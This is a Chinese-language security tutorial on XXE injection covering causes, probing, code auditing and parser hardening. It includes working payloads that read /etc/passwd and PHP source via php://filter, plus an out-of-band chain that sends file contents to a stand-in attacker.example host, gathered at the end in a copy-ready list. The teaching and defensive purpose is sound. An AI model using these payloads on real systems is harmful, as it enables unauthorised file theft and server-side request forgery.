---
title: "XXE 漏洞全解析：从成因分析、手工探测到防御实战"
slug: xxe-injection-analysis-detection-defense
cover: ""
date: 2026-01-09
categories:
  - XXE
  - top10
tags:
  - XXE
  - 漏洞审计
  - 带外探测
halo:
  site: http://www.hzhsec.top
  name: 8d23516b-99b4-437d-97c3-bc849c2e673e
  publish: true
---

<!--more-->





# 概述

XML（eXtensible Markup Language）用于传输与存储结构化数据，关注数据本身的语义，与用于显示的 HTML 不同。XXE（XML External Entity Injection）是指在应用解析不安全的 XML 输入时，允许外部实体（external entity）被解析，从而导致本地文件读取、敏感信息泄露、带外（out-of-band）回显、服务器端请求伪造（SSRF）、内网扫描甚至命令执行等严重后果。

> 说明：以下示例和 payload 均为教学用途，请仅在授权环境或靶场演练，不要用于未授权目标。

# XML 与 HTML 的主要差异

* XML 关注数据的结构与交换，适合作为 API、配置、数据持久化的载体。
* HTML 关注数据的展示与浏览器渲染。

# XXE 漏洞的成因

当应用使用不安全或默认开启外部实体解析的 XML 解析器（如某些配置的 libxml、Java DOM/SAX、PHP 的旧版本扩展等），并且未对输入来源进行严格限制或禁用外部实体解析，就会出现 XXE。

# 黑盒测试（外部探测）

## 思路

1. 发现目标接受 XML，或请求头/响应提示 Content-Type: application/xml、text/xml、application/soap+xml 等。
2. 即便目标当前不是 XML 类型，也可尝试修改 Content-Type 或提交带 XML 结构的 body 进行测试。
3. 在文件上传、预览、第三方插件解析处也可能触发 XXE（例如：上传 XML/配置文件并被服务端解析）。

## 常用初始探针（快速探测）

```
<?xml version="1.0"?>
<!DOCTYPE ANY [
  <!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

如果返回中包含 `/etc/passwd` 的内容即说明存在直接回显型 XXE。

# 白盒审计（源码/函数层面）

审计流程建议：

1. 搜索常见易受影响的解析函数，例如 `simplexml_load_string`、`DOMDocument->loadXML`、`SAXParser.parse` 等。
2. 追溯调用链（例如某些框架函数封装了解析逻辑），定位输入入口是否可控。
3. 检查解析器配置（是否禁用了实体、是否禁用了外部DTD、是否设置了安全选项）。
4. 查找对 `php://`、`file://`、`expect://`、`jar:`、`http://` 等协议的处理或过滤逻辑。

示例：在 PHP 中查找 `simplexml_load_string` 并追踪其调用路径（如：`pe_getxml` → `wechat_getxml` → `notify_url`），可快速定位可触发点。

# 利用与示例（payload）

以下 payload 展示了几类常见利用方式：直接回显、带外回显（DNSLog/HTTP 回连）、外部 DTD 引用、`php://filter` 读取并 base64 编码等。

## 1. 读取本地文件（直接回显）

```xml
<?xml version="1.0"?>
<!DOCTYPE xiaodi [
  <!ENTITY test SYSTEM "file:///d:/1.txt">
]>
<user>
  <username>&test;</username>
  <password>xiaodi</password>
</user>
```

## 2. 读取并 base64 编码 PHP 文件（绕过无回显）

```
php://filter/read=convert.base64-encode/resource=msg.php
```

将其放入实体即可把文件以 base64 形式输出，便于无二进制回显时获取内容。

## 3. 带外（OOB）探测 —— DNS/HTTP 回连

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "http://your-dnslog-server.example">
  %file;
]>
<user><username>&send;</username></user>
```

或使用外部 DTD：

```xml
<?xml version="1.0" ?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "http://127.0.0.1:8081/xiaodi.dtd">
  %file;
]>
<user><username>&send;</username></user>
```

外部 DTD（xiaodi.dtd）可以包含读取本地文件并将其发送到你的监听服务器的实体：

test.dtd 示例：

```dtd
<!ENTITY send SYSTEM "file:///d:/1.txt">
```

或者更复杂的无回显带外实现见下。

## 4. 无回显读取 + 带外回连（常用写法）

当目标不将实体插入响应时，可通过外部 DTD 的二次解析和 HTTP 回连实现泄露：

主请求：

```xml
<?xml version="1.0"?>
<!DOCTYPE updateProfile [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/path/to/secret">
  <!ENTITY % dtd SYSTEM "http://attacker.example/hzh.dtd">
  %dtd;
  %send;
]>
```

hzh.dtd（攻击者服务器上的 DTD）：

```dtd
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://attacker.example/get.php?file=%file;'>">
%all;
```

服务器会在解析外部 DTD 时向 `attacker.example` 发起请求，携带被读取的文件内容（有时需对 base64 中的空格/换行做进一步处理）。接收端可写脚本或使用 netcat（注意换行/端口参数）监听。

# 常见绕过与伪协议

* 使用 `php://filter` 读取并编码文件，绕过部分字符过滤与二进制问题。
* 使用 `expect://`（若启用）或 `jar:` 等协议进行更复杂的本地/远程交互。
* 嵌套实体（`%` 引用）常用于在 DTD 内构建多步回连链路。

# 修复与防护建议

1. **禁用外部实体解析（首选）**

**PHP**

```php
libxml_disable_entity_loader(true);
```

**Java**

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
// 进一步设置：dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Python（lxml）**

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
etree.parse(xmlSource, parser)
```

2. **过滤/拒绝不必要的 DTD 与实体声明**

在输入层面拒绝包含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 等关键字的 XML，或对这些关键字进行白名单化处理（慎用简单字符串过滤，易被编码/转义绕过）。

3. **使用安全的解析库/配置**

* 在 Java 中启用 `XMLConstants.FEATURE_SECURE_PROCESSING`，禁用外部实体与外部 DTD。
* 在 PHP 中使用 `SimpleXML`/`DOM` 时配置 libxml 选项或使用 `XMLReader` 并禁用实体。

4. **最小化解析权限**

* 运行解析操作的进程应使用最小权限帐户，避免读取敏感文件。

# 测试与检测建议（工具链）

* 使用授权的 DNSLog/HTTP 回连服务或自行搭建监听脚本（注意对 base64 中的空格与换行做处理）。
* 在代码审计阶段，关注解析函数与外部输入的交互路径。
* 在黑盒渗透测试中，尝试修改 `Content-Type`、替换请求体为 XML，并提交不同类型实体以覆盖回显/无回显场景。

# 常见 Payload 汇总（便于复制使用）

* 直接读取 `/etc/passwd`：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<x>&f;</x>
```

* 带外回连（外部 DTD）：

```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "http://attacker.example/evil.dtd">
  %file;
]>
<root>&send;</root>
```

* php://filter 读取并 base64 编码：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/secret.php">
]>
<root>&xxe;</root>
```

# 其他参考与延伸

* XXE 与 SSRF 在某些场景重合（例如外部实体触发对内网请求），在应急响应时需要同时考虑两者影响范围。
* 对于复杂环境（容器、沙箱），要判断解析器是否支持外部实体、是否允许访问宿主文件系统或内置协议。

---